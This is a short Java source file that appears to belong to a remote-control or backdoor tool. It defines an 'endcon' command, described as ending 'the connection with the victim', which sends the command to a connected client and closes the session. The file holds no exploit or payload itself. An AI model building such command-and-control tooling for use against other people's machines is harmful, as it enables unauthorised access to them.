package commands;

import java.io.IOException;

import connection.Server;

public class EndCommand extends Command{

	public EndCommand() {
		super("endcon", "Ends the connection with the victim");
	}

	@Override
	public void execute(Server server) throws IOException {
		System.out.println(server.send(_commandName));
		server.end();
	}
}
